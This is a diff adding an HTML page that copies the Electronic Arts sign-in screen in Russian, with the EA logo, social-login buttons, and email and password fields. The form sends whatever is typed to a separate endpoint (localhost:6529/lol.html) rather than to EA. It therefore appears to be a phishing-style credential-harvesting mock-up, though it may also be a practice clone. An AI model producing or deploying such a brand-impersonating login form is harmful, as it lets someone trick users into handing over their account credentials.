@@ -1,0 +1,77 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>EA</title>
+    <link href="css/sylesMail.css" rel="stylesheet">
+</head>
+<body>
+    <div class="container">
+        <!-- Лого-->
+        <div>
+            <img class="header" src="images/EALogo.png">
+        </div>
+        <!--Текст-->
+        <div>
+            <h2 class="text-center txt-family" style="color: white; margin: 0 0 24px;">Выполнение входа в учётную запись EA</h2>
+        </div>
+
+        <!-- Картинки-->
+        <div class="social-login-logos">
+            <img class="logos right pointer" src="images/google.png" style="background-color: #fff">
+            <img class="logos right pointer" src="images/facebook.png" style="background-color: #1977f2">
+            <img class="logos right pointer" src="images/apple.png" style="background-color: #fff">
+            <img class="logos right pointer" src="images/steam.png" style="background-color: black">
+            <img class="logos right pointer" src="images/xbox.png" style="background-color: #107c10">
+            <img class="logos right pointer" src="images/psn.png" style="background-color: #0049a0">
+        </div>
+
+
+        <!-- Линия и или -->
+        <div style="height: 7px">
+            <div class="line"></div>
+        </div>
+        <div style="height: 32px"></div>
+
+        <!-- Телефон почта и электорная почта  инпут и кнопка и галочка-->
+        <form action="http://localhost:6529/lol.html" method="POST">
+            <div class="text-label" style="letter-spacing: .05em; padding-top: 15px">
+                <a class="txt-family">Телефон или электронная почта</a>
+            </div>
+            <label for="submit">
+                <input type="email" name="email" class="input-txt d-flex" placeholder="Введите свой телефон или электронную почту" style="width: 100%">
+            </label>
+
+
+            <div class="text-label" style="letter-spacing: .05em; padding-top: 15px"><a class="txt-family">Пароль</a></div>
+            <label for="submit">
+                <input type="password" name="password" class="input-txt d-flex" placeholder="Введите пароль" style="width: 100%" />
+            </label>
+
+            <div style="margin: 0; padding-bottom: 15px; padding-top: 15px; border: solid 0 transparent;">
+                <label class="remember pointer">
+                    <input type="checkbox" checked="checked" style="cursor: pointer; width: 24px; height: 24px;">
+                    <a style="letter-spacing: .03em; font-weight: bold; margin-left: 10px;" class="txt-family">Запомнить меня</a>
+                </label>
+            </div>
+            <div style="height: 15px"></div>
+            <button type="submit" id="submit" class="btn pointer">
+                Войти
+            </button>
+        </form>
+        <div style="height: 32px"></div>
+        <!-- Забыли паро
+            ,ль  и кнопка создать акк -->
+        <div style="text-align: center">
+            <a href="#" class="forget-password txt-family">Забыли пароль или хотите установить новый?</a>
+        </div>
+        <div style="height: 32px"></div>
+        <div style="height: 24px">
+            <button class="btn btn-black pointer">СОЗДАТЬ УЧЕТНУЮ ЗАПИСЬ</button>
+        </div>
+        <div style="height: 32px">
+
+        </div>
+    </div>
+</body>
+</html>
